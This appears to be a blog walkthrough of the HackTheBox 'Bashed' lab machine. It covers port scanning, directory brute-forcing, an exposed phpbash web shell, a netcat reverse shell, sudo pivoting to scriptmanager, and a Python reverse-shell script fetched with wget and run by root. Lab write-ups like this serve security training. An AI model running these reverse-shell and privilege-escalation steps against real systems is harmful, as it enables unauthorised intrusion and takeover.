---
layout: page
title: Bashed
description: Blocky from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/bashed/logo.png" title="HTB Bashed Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Bashed">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to smash the Bashed.

Run nmap to get a list of available ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.68             
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 00:32 AEDT
Nmap scan report for 10.10.10.68
Host is up (0.017s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   7.84 ms  10.10.16.1
2   37.40 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```
{% endraw %}

<br />
Run nmap against all of the ports to get any potentially hidden services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.68               
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 00:33 AEDT
Nmap scan report for 10.10.10.68
Host is up (0.020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds
```
{% endraw %}

<br />
Check the landing page that is being served on the web server.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bashed/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the one post that is displayed on the landing page.  That looks interesting as an attack vector.  Plus, should be on this server.  Convenient.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bashed/post.png" title="Check the Post" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the ffuf to try and brute-force directories.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.68/FUZZ -e .txt,.bak,.php -fs 7743

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.68/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7743
________________________________________________

.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 12ms]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 11ms]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 18ms]
php                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 8ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 22ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 12ms]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 18ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 28ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```
{% endraw %}

<br />
Check the /dev directory and notice the phpbash.php.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bashed/dev.png" title="Check the Dev Directory" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the phpbash.php and run whoami to confirm code execution.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bashed/cmd.png" title="Prove command execution" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ sudo nc -nlvp 443                           
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use revshells to generate a payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bashed/revshells.png" title="Use Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the netcat listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ sudo nc -nlvp 443                           
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.68] 52940
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");
```
{% endraw %}

<br />
Run sudo -l to get the list of all the commands that the user can run as sudo.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ sudo nc -nlvp 443                           
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.68] 52940
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@bashed:/var/www/html/dev$ sudo -l 
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
www-data@bashed
:/var/www/html/dev# cat /home/arrexel/user.txt

<redacted>
www-data@bashed
:/var/www/html/dev# ip a

1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33:  mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:69:30 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.68/32 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:6930/64 scope global mngtmpaddr dynamic 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:6930/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run whoami using the sudo as scriptmanger just to test the command execution.

{% raw %}
```sh
www-data@bashed:/dev/shm$ sudo -i -u scriptmanager whoami
sudo -i -u scriptmanager whoami
scriptmanager
```
{% endraw %}

<br />
List the files on the root directory.  Notice the /scripts folder owned by the user that we have sudo privs to execute.

{% raw %}
```sh
www-data@bashed:/dev/shm$ ls -la /
ls -la /
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            174 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Jan 28 05:25 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 173 root          root              0 Jan 28 05:25 proc
drwx------   3 root          root           4096 Jan 28 05:27 root
drwxr-xr-x  18 root          root            500 Jan 28 05:25 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Jan 28 06:08 sys
drwxrwxrwt  10 root          root           4096 Jan 28 06:15 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```
{% endraw %}

<br />
As the scriptmanager, ls said scripts folder.

{% raw %}
```sh
www-data@bashed:/dev/shm$ sudo -i -u scriptmanager ls -la /scripts
sudo -i -u scriptmanager ls -la /scripts
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jan 28 06:16 test.txt
```
{% endraw %}

<br />
Check the contents of the test.py file.

{% raw %}
```sh
sudo -i -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
{% endraw %}

<br />
Start a second netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
```
{% endraw %}

<br />
Create a new test.py file to create a reverse shell.

{% raw %}
```python
import socket
import subprocess
import os
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.12",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```
{% endraw %}

<br />
Create a python server to serve the test.py.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the test.py to the victim machine.

{% raw %}
```sh
www-data@bashed:/dev/shm$ wget http://10.10.16.12:8000/test.py
wget http://10.10.16.12:8000/test.py
--2025-01-28 06:33:24--  http://10.10.16.12:8000/test.py
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 219 [text/x-python]
Saving to: 'test.py'

test.py             100%[===================>]     219  --.-KB/s    in 0.001s  

2025-01-28 06:33:24 (320 KB/s) - 'test.py' saved [219/219]
```
{% endraw %}

<br />
Try moving the file to overwrite the /scripts/test.py.  Notice that there was an error that states that the operation is not permitted.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ sudo nc -nlvp 443                           
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
As I was trying to figure out what to do about that error, I checked the error and noticed that I caught a shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/bashed]
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.68] 46880
# whoami
whoami
root
#
```
{% endraw %}

<br />
Get the root.txt file.

{% raw %}
```sh
# cat /root/root.txt
cat /root/root.txt
<redacted>
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:69:30 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.68/32 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:6930/64 scope global mngtmpaddr dynamic 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb9:6930/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that we bashed another box.